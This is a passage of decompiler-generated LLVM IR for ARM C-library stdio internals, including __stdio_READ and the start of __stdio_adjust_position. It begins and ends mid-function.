  %v7_1eba0 = icmp eq i32 %tmp18, 2
  %v0_1eba4 = load i32, i32* @r0, align 4
  store i32 %v0_1eba4, i32* @r7, align 4
  %v2_1eba8 = xor i1 %v2_1eba0, true
  %v3_1eba8 = or i1 %v7_1eba0, %v2_1eba8
  br i1 %v3_1eba8, label %dec_label_pc_1ebc8, label %dec_label_pc_1ebac

dec_label_pc_1ebac:                               ; preds = %entry
  store i32 79052, i32* %r2.global-to-local, align 4
  %v0_1ebb0 = call i32 @__aeabi_read_tp()
  %v3_1ebb4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1ebb4 = sext i16 %v3_1ebb4 to i32
  store i32 %v4_1ebb4, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  %v3_1ebc0 = add i32 %v4_1ebb4, %v0_1ebb0
  %v4_1ebc0 = inttoptr i32 %v3_1ebc0 to i32*
  store i32 22, i32* %v4_1ebc0, align 4
  br label %dec_label_pc_1ed40

dec_label_pc_1ebc8:                               ; preds = %entry
  %v1_1ebc8 = add i32 %v0_1eba4, 52
  %v2_1ebc8 = inttoptr i32 %v1_1ebc8 to i32*
  %v3_1ebc8 = load i32, i32* %v2_1ebc8, align 4
  store i32 %v3_1ebc8, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ebcc = icmp eq i32 %v3_1ebc8, 0
  %v2_1ebd0 = load i32, i32* @r2, align 4
  store i32 %v2_1ebd0, i32* %stack_var_-40, align 4
  br i1 %v2_1ebcc, label %dec_label_pc_1ebd8, label %dec_label_pc_1ec3c

dec_label_pc_1ebd8:                               ; preds = %dec_label_pc_1ebc8
  %v0_1ebd8 = call i32 @__aeabi_read_tp()
  %v0_1ebdc = load i32, i32* @r7, align 4
  %v1_1ebdc = add i32 %v0_1ebdc, 64
  %v2_1ebdc = inttoptr i32 %v1_1ebdc to i32*
  %v3_1ebdc = load i32, i32* %v2_1ebdc, align 4
  store i32 %v3_1ebdc, i32* %r3.global-to-local, align 4
  %v1_1ebe0 = add i32 %v0_1ebd8, -1168
  store i32 %v1_1ebe0, i32* %r6.global-to-local, align 4
  %v3_1ebe4 = icmp uge i32 %v3_1ebdc, %v1_1ebe0
  store i1 %v3_1ebe4, i1* %cpsr_c.global-to-local, align 1
  %v9_1ebe4 = icmp eq i32 %v3_1ebdc, %v1_1ebe0
  br i1 %v9_1ebe4, label %dec_label_pc_1ec30, label %dec_label_pc_1ebec

dec_label_pc_1ebec:                               ; preds = %dec_label_pc_1ebd8
  %v1_1ebec = add i32 %v0_1ebdc, 56
  store i32 %v1_1ebec, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1ebec, i32* %r2.global-to-local, align 4
  %v0_1ebf8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1ebf8, i32* @r4, align 4
  %v1_1ebfc37 = inttoptr i32 %v1_1ebec to i32*
  %v2_1ebfc38 = load i32, i32* %v1_1ebfc37, align 4
  store i32 %v2_1ebfc38, i32* %r3.global-to-local, align 4
  %v3_1ec0040 = icmp uge i32 %v2_1ebfc38, %v0_1ebf8
  store i1 %v3_1ec0040, i1* %cpsr_c.global-to-local, align 1
  %v9_1ec0046 = icmp eq i32 %v2_1ebfc38, %v0_1ebf8
  br i1 %v9_1ec0046, label %dec_label_pc_1ec08, label %dec_label_pc_1ec20

dec_label_pc_1ec08:                               ; preds = %dec_label_pc_1ebec, %dec_label_pc_1ec08.dec_label_pc_1ebfc_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1ec18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1ec18, label %dec_label_pc_1ec1c, label %dec_label_pc_1ec08.dec_label_pc_1ebfc_crit_edge

dec_label_pc_1ec08.dec_label_pc_1ebfc_crit_edge:  ; preds = %dec_label_pc_1ec08
  %v0_1ebfc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ec00.pre = load i32, i32* @r4, align 4
  %v1_1ebfc = inttoptr i32 %v0_1ebfc.pre to i32*
  %v2_1ebfc = load i32, i32* %v1_1ebfc, align 4
  store i32 %v2_1ebfc, i32* %r3.global-to-local, align 4
  %v3_1ec00 = icmp uge i32 %v2_1ebfc, %v1_1ec00.pre
  store i1 %v3_1ec00, i1* %cpsr_c.global-to-local, align 1
  %v9_1ec00 = icmp eq i32 %v2_1ebfc, %v1_1ec00.pre
  br i1 %v9_1ec00, label %dec_label_pc_1ec08, label %dec_label_pc_1ec20

dec_label_pc_1ec1c:                               ; preds = %dec_label_pc_1ec08
  %v0_1ec1c = load i32, i32* @r4, align 4
  store i32 %v0_1ec1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ec20

dec_label_pc_1ec20:                               ; preds = %dec_label_pc_1ebec, %dec_label_pc_1ec08.dec_label_pc_1ebfc_crit_edge, %dec_label_pc_1ec1c
  %v0_1ec20 = phi i32 [ %v0_1ec1c, %dec_label_pc_1ec1c ], [ %v2_1ebfc38, %dec_label_pc_1ebec ], [ %v2_1ebfc, %dec_label_pc_1ec08.dec_label_pc_1ebfc_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ec20 = icmp eq i32 %v0_1ec20, 0
  br i1 %v2_1ec20, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_1ec20
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1ec20, %bb
  store i32 125996, i32* @lr, align 4
  %v1_1ec28 = xor i1 %v2_1ec20, true
  call void @__pseudo_cond_branch(i1 %v1_1ec28, i32 ptrtoint (i32* @global_var_1907c.1373 to i32))
  %v0_1ec2c = load i32, i32* %r6.global-to-local, align 4
  %v1_1ec2c = load i32, i32* @r7, align 4
  %v2_1ec2c = add i32 %v1_1ec2c, 64
  %v3_1ec2c = inttoptr i32 %v2_1ec2c to i32*
  store i32 %v0_1ec2c, i32* %v3_1ec2c, align 4
  %v0_1ec30.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1ec30

dec_label_pc_1ec30:                               ; preds = %dec_label_pc_1ebd8, %bb21
  %v0_1ec30 = phi i32 [ %v0_1ebdc, %dec_label_pc_1ebd8 ], [ %v0_1ec30.pre, %bb21 ]
  %v1_1ec30 = add i32 %v0_1ec30, 60
  %v2_1ec30 = inttoptr i32 %v1_1ec30 to i32*
  %v3_1ec30 = load i32, i32* %v2_1ec30, align 4
  %v1_1ec34 = add i32 %v3_1ec30, 1
  store i32 %v1_1ec34, i32* %r3.global-to-local, align 4
  store i32 %v1_1ec34, i32* %v2_1ec30, align 4
  %v0_1ec3c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1ec3c

dec_label_pc_1ec3c:                               ; preds = %dec_label_pc_1ebc8, %dec_label_pc_1ec30
  %v0_1ec48 = phi i32 [ %v0_1eba4, %dec_label_pc_1ebc8 ], [ %v0_1ec3c.pre, %dec_label_pc_1ec30 ]
  %v1_1ec3c = inttoptr i32 %v0_1ec48 to i16*
  %v2_1ec3c = load i16, i16* %v1_1ec3c, align 2
  %v3_1ec3c = zext i16 %v2_1ec3c to i32
  store i32 %v3_1ec3c, i32* %r3.global-to-local, align 4
  %v1_1ec40 = and i32 %v3_1ec3c, 64
  %v2_1ec40 = icmp eq i32 %v1_1ec40, 0
  br i1 %v2_1ec40, label %dec_label_pc_1ec58, label %dec_label_pc_1ec48

dec_label_pc_1ec48:                               ; preds = %dec_label_pc_1ec3c
  store i32 %v0_1ec48, i32* @r0, align 4
  %v0_1ec4c = call i32 @__stdio_wcommit()
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ec50 = icmp eq i32 %v0_1ec4c, 0
  br i1 %v2_1ec50, label %dec_label_pc_1ec58, label %dec_label_pc_1ecc0

dec_label_pc_1ec58:                               ; preds = %dec_label_pc_1ec48, %dec_label_pc_1ec3c
  %v0_1ec58 = load i32, i32* %sl.global-to-local, align 4
  %v2_1ec58 = icmp ne i32 %v0_1ec58, 0
  store i1 %v2_1ec58, i1* %cpsr_c.global-to-local, align 1
  %v7_1ec58 = icmp eq i32 %v0_1ec58, 1
  br i1 %v7_1ec58, label %dec_label_pc_1ec60, label %dec_label_pc_1ec74

dec_label_pc_1ec60:                               ; preds = %dec_label_pc_1ec58
  %v0_1ec60 = load i32, i32* @r7, align 4
  store i32 %v2_1eb98, i32* %r1.global-to-local, align 4
  %v2_1ec68 = inttoptr i32 %v0_1ec60 to i16*
  %v3_1ec68 = call i32 @__stdio_adjust_position(i16* %v2_1ec68, i32 %v2_1eb98)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1ec6c = icmp slt i32 %v3_1ec68, 0
  br i1 %v1_1ec6c, label %dec_label_pc_1ecc0, label %dec_label_pc_1ec60.dec_label_pc_1ec74_crit_edge

dec_label_pc_1ec60.dec_label_pc_1ec74_crit_edge:  ; preds = %dec_label_pc_1ec60
  %v0_1ec74.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1ec74

dec_label_pc_1ec74:                               ; preds = %dec_label_pc_1ec60.dec_label_pc_1ec74_crit_edge, %dec_label_pc_1ec58
  %v0_1ec74 = phi i32 [ %v0_1ec74.pre, %dec_label_pc_1ec60.dec_label_pc_1ec74_crit_edge ], [ %v0_1ec58, %dec_label_pc_1ec58 ]
  store i32 %v0_1ec74, i32* %r2.global-to-local, align 4
  %v0_1ec78 = load i32, i32* @r7, align 4
  store i32 %v2_1eb98, i32* %r1.global-to-local, align 4
  %v4_1ec80 = call i32 @__stdio_seek(i32 %v0_1ec78, i32* nonnull %stack_var_-40, i32 %v0_1ec74)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1ec84 = icmp slt i32 %v4_1ec80, 0
  br i1 %v1_1ec84, label %dec_label_pc_1ecc0, label %dec_label_pc_1ec8c

dec_label_pc_1ec8c:                               ; preds = %dec_label_pc_1ec74
  %v0_1ec8c = load i32, i32* @r7, align 4
  %v1_1ec8c = inttoptr i32 %v0_1ec8c to i16*
  %v2_1ec8c = load i16, i16* %v1_1ec8c, align 2
  %v3_1ec8c = zext i16 %v2_1ec8c to i32
  store i32 %v3_1ec8c, i32* %r3.global-to-local, align 4
  %v1_1ec90 = add i32 %v0_1ec8c, 8
  %v2_1ec90 = inttoptr i32 %v1_1ec90 to i32*
  %v3_1ec90 = load i32, i32* %v2_1ec90, align 4
  store i32 %v3_1ec90, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1ec98 = and i32 %v3_1ec8c, 65464
  store i32 %v1_1ec98, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_1eca0 = trunc i32 %v1_1ec98 to i16
  store i16 %v1_1eca0, i16* %v1_1ec8c, align 2
  %v0_1eca4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1eca4 = load i32, i32* @r7, align 4
  %v2_1eca4 = add i32 %v1_1eca4, 28
  %v3_1eca4 = inttoptr i32 %v2_1eca4 to i32*
  store i32 %v0_1eca4, i32* %v3_1eca4, align 4
  %v0_1eca8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1eca8 = load i32, i32* @r7, align 4
  %v2_1eca8 = add i32 %v1_1eca8, 16
  %v3_1eca8 = inttoptr i32 %v2_1eca8 to i32*
  store i32 %v0_1eca8, i32* %v3_1eca8, align 4
  %v0_1ecac = load i32, i32* %r2.global-to-local, align 4
  %v1_1ecac = load i32, i32* @r7, align 4
  %v2_1ecac = add i32 %v1_1ecac, 20
  %v3_1ecac = inttoptr i32 %v2_1ecac to i32*
  store i32 %v0_1ecac, i32* %v3_1ecac, align 4
  %v0_1ecb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1ecb0 = load i32, i32* @r7, align 4
  %v2_1ecb0 = add i32 %v1_1ecb0, 24
  %v3_1ecb0 = inttoptr i32 %v2_1ecb0 to i32*
  store i32 %v0_1ecb0, i32* %v3_1ecb0, align 4
  %v0_1ecb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ecb4 = load i32, i32* @r7, align 4
  %v2_1ecb4 = add i32 %v1_1ecb4, 44
  %v3_1ecb4 = inttoptr i32 %v2_1ecb4 to i32*
  store i32 %v0_1ecb4, i32* %v3_1ecb4, align 4
  %v0_1ecb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ecb8 = trunc i32 %v0_1ecb8 to i8
  %v2_1ecb8 = load i32, i32* @r7, align 4
  %v3_1ecb8 = add i32 %v2_1ecb8, 2
  %v4_1ecb8 = inttoptr i32 %v3_1ecb8 to i8*
  store i8 %v1_1ecb8, i8* %v4_1ecb8, align 1
  br label %dec_label_pc_1ecc4

dec_label_pc_1ecc0:                               ; preds = %dec_label_pc_1ec48, %dec_label_pc_1ec74, %dec_label_pc_1ec60
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ecc4

dec_label_pc_1ecc4:                               ; preds = %dec_label_pc_1ec8c, %dec_label_pc_1ecc0
  %v0_1ecc4 = load i32, i32* %r8.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ecc4 = icmp eq i32 %v0_1ecc4, 0
  br i1 %v2_1ecc4, label %dec_label_pc_1eccc, label %dec_label_pc_1ed40

dec_label_pc_1eccc:                               ; preds = %dec_label_pc_1ecc4
  %v0_1eccc = load i32, i32* @r7, align 4
  %v1_1eccc = add i32 %v0_1eccc, 60
  %v2_1eccc = inttoptr i32 %v1_1eccc to i32*
  %v3_1eccc = load i32, i32* %v2_1eccc, align 4
  %v1_1ecd0 = add i32 %v3_1eccc, -1
  store i32 %v1_1ecd0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1ecd4 = icmp eq i32 %v1_1ecd0, 0
  store i32 %v1_1ecd0, i32* %v2_1eccc, align 4
  br i1 %v2_1ecd4, label %dec_label_pc_1ece0, label %dec_label_pc_1ed40

dec_label_pc_1ece0:                               ; preds = %dec_label_pc_1eccc
  %v0_1ece0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ece0 = load i32, i32* @r7, align 4
  %v2_1ece0 = add i32 %v1_1ece0, 64
  %v3_1ece0 = inttoptr i32 %v2_1ece0 to i32*
  store i32 %v0_1ece0, i32* %v3_1ece0, align 4
  %v0_1ece4 = load i32, i32* @r7, align 4
  %v1_1ece4 = add i32 %v0_1ece4, 56
  store i32 %v1_1ece4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1ece8

dec_label_pc_1ece8:                               ; preds = %dec_label_pc_1ed18.dec_label_pc_1ece8_crit_edge, %dec_label_pc_1ece0
  %v0_1ecf0 = phi i32 [ %v0_1ecf0.pre, %dec_label_pc_1ed18.dec_label_pc_1ece8_crit_edge ], [ %v1_1ece4, %dec_label_pc_1ece0 ]
  %v0_1ece8 = phi i32 [ %v0_1ece8.pre, %dec_label_pc_1ed18.dec_label_pc_1ece8_crit_edge ], [ %v0_1ece4, %dec_label_pc_1ece0 ]
  %v1_1ece8 = add i32 %v0_1ece8, 56
  %v2_1ece8 = inttoptr i32 %v1_1ece8 to i32*
  %v3_1ece8 = load i32, i32* %v2_1ece8, align 4
  store i32 %v3_1ece8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1ecf0, i32* %r2.global-to-local, align 4
  %v1_1ecf425 = inttoptr i32 %v0_1ecf0 to i32*
  %v2_1ecf426 = load i32, i32* %v1_1ecf425, align 4
  store i32 %v2_1ecf426, i32* %r3.global-to-local, align 4
  %v3_1ecf828 = icmp uge i32 %v2_1ecf426, %v3_1ece8
  store i1 %v3_1ecf828, i1* %cpsr_c.global-to-local, align 1
  %v9_1ecf834 = icmp eq i32 %v2_1ecf426, %v3_1ece8
  br i1 %v9_1ecf834, label %dec_label_pc_1ed00, label %dec_label_pc_1ed18

dec_label_pc_1ed00:                               ; preds = %dec_label_pc_1ece8, %dec_label_pc_1ed00.dec_label_pc_1ecf4_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1ed10 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1ed10, label %dec_label_pc_1ed14, label %dec_label_pc_1ed00.dec_label_pc_1ecf4_crit_edge

dec_label_pc_1ed00.dec_label_pc_1ecf4_crit_edge:  ; preds = %dec_label_pc_1ed00
  %v0_1ecf4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ecf8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1ecf4 = inttoptr i32 %v0_1ecf4.pre to i32*
  %v2_1ecf4 = load i32, i32* %v1_1ecf4, align 4
  store i32 %v2_1ecf4, i32* %r3.global-to-local, align 4
  %v3_1ecf8 = icmp uge i32 %v2_1ecf4, %v1_1ecf8.pre
  store i1 %v3_1ecf8, i1* %cpsr_c.global-to-local, align 1
  %v9_1ecf8 = icmp eq i32 %v2_1ecf4, %v1_1ecf8.pre
  br i1 %v9_1ecf8, label %dec_label_pc_1ed00, label %dec_label_pc_1ed18

dec_label_pc_1ed14:                               ; preds = %dec_label_pc_1ed00
  %v0_1ed14 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1ed14, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ed18

dec_label_pc_1ed18:                               ; preds = %dec_label_pc_1ece8, %dec_label_pc_1ed00.dec_label_pc_1ecf4_crit_edge, %dec_label_pc_1ed14
  %v0_1ed20 = phi i32 [ %v0_1ed14, %dec_label_pc_1ed14 ], [ %v2_1ecf426, %dec_label_pc_1ece8 ], [ %v2_1ecf4, %dec_label_pc_1ed00.dec_label_pc_1ecf4_crit_edge ]
  %v1_1ed18 = phi i32 [ %v0_1ed14, %dec_label_pc_1ed14 ], [ %v3_1ece8, %dec_label_pc_1ece8 ], [ %v1_1ecf8.pre, %dec_label_pc_1ed00.dec_label_pc_1ecf4_crit_edge ]
  %v3_1ed18 = icmp uge i32 %v0_1ed20, %v1_1ed18
  store i1 %v3_1ed18, i1* %cpsr_c.global-to-local, align 1
  %v9_1ed18 = icmp eq i32 %v0_1ed20, %v1_1ed18
  br i1 %v9_1ed18, label %dec_label_pc_1ed20, label %dec_label_pc_1ed18.dec_label_pc_1ece8_crit_edge

dec_label_pc_1ed18.dec_label_pc_1ece8_crit_edge:  ; preds = %dec_label_pc_1ed18
  %v0_1ece8.pre = load i32, i32* @r7, align 4
  %v0_1ecf0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1ece8

dec_label_pc_1ed20:                               ; preds = %dec_label_pc_1ed18
  %v2_1ed20 = icmp ne i32 %v1_1ed18, 0
  store i1 %v2_1ed20, i1* %cpsr_c.global-to-local, align 1
  %v7_1ed24 = icmp slt i32 %v1_1ed18, 2
  br i1 %v7_1ed24, label %dec_label_pc_1ed40, label %dec_label_pc_1ed28

dec_label_pc_1ed28:                               ; preds = %dec_label_pc_1ed20
  %v0_1ed2c = load i32, i32* %r1.global-to-local, align 4
  %v1_1ed2c = add i32 %v0_1ed2c, 129
  store i32 %v1_1ed2c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1ed40

dec_label_pc_1ed40:                               ; preds = %dec_label_pc_1eccc, %dec_label_pc_1ecc4, %dec_label_pc_1ed28, %dec_label_pc_1ed20, %dec_label_pc_1ebac
  %v0_1ed40 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v3_1eb94, i32* @r4, align 4
  store i32 %v6_1eb94, i32* @r5, align 4
  store i32 %v12_1eb94, i32* @r7, align 4
  ret i32 %v0_1ed40

; uselistorder directives
  uselistorder i32 %v0_1ed14, { 1, 0, 2 }
  uselistorder i32 %v1_1ecf8.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1ec74, { 1, 0 }
  uselistorder i32 %v0_1ec58, { 0, 2, 1 }
  uselistorder i32 %v1_1ec00.pre, { 1, 0 }
  uselistorder i32 %v2_1eb98, { 0, 2, 1 }
  uselistorder i32 %tmp18, { 2, 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1, 15, 16 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1, 15, 16, 17 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 46, 47, 48, 44, 45, 49, 50, 51 }
  uselistorder i32 -61441, { 40, 41, 28, 29, 30, 31, 32, 33, 24, 25, 26, 27, 34, 35, 16, 17, 36, 37, 38, 39, 18, 19, 20, 21, 22, 23, 0, 5, 6, 7, 8, 9, 10, 44, 2, 3, 11, 12, 13, 14, 15, 1, 42, 43, 4 }
  uselistorder label %dec_label_pc_1ed40, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_1ed18, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ed00, { 1, 0 }
  uselistorder label %dec_label_pc_1ecc4, { 1, 0 }
  uselistorder label %dec_label_pc_1ecc0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1ec3c, { 1, 0 }
  uselistorder label %dec_label_pc_1ec30, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_1ec20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ec08, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1ed54 = load i32, i32* @r4, align 4
  store i32 %v3_1ed54, i32* %stack_var_-12, align 4
  %v0_1ed58 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ed58 = inttoptr i32 %v0_1ed58 to i16*
  %v2_1ed58 = load i16, i16* %v1_1ed58, align 2
  %v3_1ed58 = zext i16 %v2_1ed58 to i32
  store i32 %v3_1ed58, i32* @r3, align 4
  %v1_1ed5c = and i32 %v3_1ed58, 4
  store i32 %v1_1ed5c, i32* @r5, align 4
  %v2_1ed5c = icmp eq i32 %v1_1ed5c, 0
  store i32 %v0_1ed58, i32* @r4, align 4
  br i1 %v2_1ed5c, label %dec_label_pc_1ed70, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1ed70:                               ; preds = %entry
  %v1_1ed70 = icmp slt i32 %arg2, 0
  br i1 %v1_1ed70, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1ed70
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1ed70, %bb18
  %v1_1ed78 = add i32 %v0_1ed58, 4
  %v2_1ed78 = inttoptr i32 %v1_1ed78 to i32*
  %v3_1ed78 = load i32, i32* %v2_1ed78, align 4
  store i32 %v3_1ed78, i32* %r0.global-to-local, align 4
  %v1_1ed7c = call i32 @__libc_read(i32 %v3_1ed78)
  store i32 %v1_1ed7c, i32* %r0.global-to-local, align 4
  %v5_1ed84 = icmp sgt i32 %v1_1ed7c, 0
  br i1 %v5_1ed84, label %.thread7, label %dec_label_pc_1ed88

dec_label_pc_1ed88:                               ; preds = %bb19
  %v2_1ed80 = icmp eq i32 %v1_1ed7c, 0
  %v0_1ed88 = load i32, i32* @r4, align 4
  %v1_1ed88 = inttoptr i32 %v0_1ed88 to i16*
  %v2_1ed88 = load i16, i16* %v1_1ed88, align 2
  br i1 %v2_1ed80, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1ed88
  %v2_1ed8c = or i16 %v2_1ed88, 4
  store i16 %v2_1ed8c, i16* %v1_1ed88, align 2
  %v1_1eda8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1ed88
  %v2_1ed90 = or i16 %v2_1ed88, 8
  store i16 %v2_1ed90, i16* %v1_1ed88, align 2
  %v1_1ed9c = load i32, i32* @r5, align 4
  store i32 %v1_1ed9c, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1eda8 = phi i32 [ %v1_1eda8.pre, %bb20 ], [ 0, %bb ], [ %v1_1ed7c, %bb19 ], [ %v1_1ed9c, %bb21 ]
  %v2_1eda4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1eda4, i32* @r4, align 4
  ret i32 %v1_1eda8

; uselistorder directives
  uselistorder i16 %v2_1ed88, { 1, 0 }
  uselistorder i32 %v1_1ed7c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder i32 2147483647, { 6, 0, 1, 7, 2, 5, 3, 4 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1edac = load i32, i32* @r4, align 4
  store i32 %v3_1edac, i32* %stack_var_-12, align 4
  %v3_1edb0 = load i16, i16* %arg1, align 2
  %v4_1edb0 = zext i16 %v3_1edb0 to i32
  store i32 %v4_1edb0, i32* @ip, align 4
  %tmp16 = urem i16 %v3_1edb0, 4
  %v1_1edb4 = zext i16 %tmp16 to i32
  store i32 %v1_1edb4, i32* %r2.global-to-local, align 4
  %v2_1edb4 = icmp eq i16 %tmp16, 0
  br i1 %v2_1edb4, label %bb, label %dec_label_pc_1edc4

bb:                                               ; preds = %entry
  br label %bb13

dec_label_pc_1edc4:                               ; preds = %entry
  %v1_1edc4 = add nsw i32 %v1_1edb4, -1
  %v7_1edc4 = icmp eq i16 %tmp16, 1
  br i1 %v7_1edc4, label %bb13, label %dec_label_pc_1edcc

dec_label_pc_1edcc:                               ; preds = %dec_label_pc_1edc4
  %v1_1edcc = and i32 %v4_1edb0, 2048
  %v2_1edcc = icmp eq i32 %v1_1edcc, 0
  br i1 %v2_1edcc, label %bb13, label %dec_label_pc_1edd4

dec_label_pc_1edd4:                               ; preds = %dec_label_pc_1edcc
  %v7_1edd4 = icmp eq i32 %v1_1edc4, 2
  br i1 %v7_1edd4, label %dec_label_pc_1ee60, label %dec_label_pc_1eddc

dec_label_pc_1eddc:                               ; preds = %dec_label_pc_1edd4
  %v2_1eddc = add i32 %tmp, 40
  %v3_1eddc = inttoptr i32 %v2_1eddc to i32*
  %v4_1eddc = load i32, i32* %v3_1eddc, align 4
  store i32 %v4_1eddc, i32* %r3.global-to-local, align 4
  %v2_1ede0 = icmp eq i32 %v4_1eddc, 0
  br i1 %v2_1ede0, label %dec_label_pc_1ede8, label %dec_label_pc_1ee60

dec_label_pc_1ede8:                               ; preds = %dec_label_pc_1eddc
  %v2_1ede8 = add i32 %tmp, 44
  %v3_1ede8 = inttoptr i32 %v2_1ede8 to i32*
  %v4_1ede8 = load i32, i32* %v3_1ede8, align 4
  store i32 %v4_1ede8, i32* %r3.global-to-local, align 4
  %v2_1edec = add i32 %tmp, 3
  %v3_1edec = inttoptr i32 %v2_1edec to i8*
  %v4_1edec = load i8, i8* %v3_1edec, align 1
  %v5_1edec = zext i8 %v4_1edec to i32
  store i32 %v5_1edec, i32* %r2.global-to-local, align 4
  %v2_1edf0 = icmp eq i32 %v4_1ede8, 0
  br i1 %v2_1edf0, label %.thread1, label %bb12

.thread1:                                         ; preds = %dec_label_pc_1ede8
  %v1_1edf83 = sub nsw i32 0, %v5_1edec
  br label %bb13

bb12:                                             ; preds = %dec_label_pc_1ede8
  %v3_1edf4 = add i32 %tmp, 2
  %v4_1edf4 = inttoptr i32 %v3_1edf4 to i8*
  %v5_1edf4 = load i8, i8* %v4_1edf4, align 1
  %v6_1edf4 = zext i8 %v5_1edf4 to i32
  store i32 %v6_1edf4, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_1edf4, %v5_1edec
  %v3_1edfc = sub nsw i32 0, %sum
  br label %bb13

bb13:                                             ; preds = %bb, %.thread1, %dec_label_pc_1edcc, %dec_label_pc_1edc4, %bb12
  %v1_1ee10 = phi i32 [ %v1_1edf83, %.thread1 ], [ %v1_1edc4, %dec_label_pc_1edcc ], [ %v1_1edc4, %dec_label_pc_1edc4 ], [ 0, %bb ], [ %v3_1edfc, %bb12 ]
  %v1_1ee00 = and i32 %v4_1edb0, 64
  %v2_1ee00 = icmp eq i32 %v1_1ee00, 0
  %v2_1ee04 = add i32 %tmp, 16
  %v3_1ee04 = inttoptr i32 %v2_1ee04 to i32*
  %v4_1ee04 = load i32, i32* %v3_1ee04, align 4
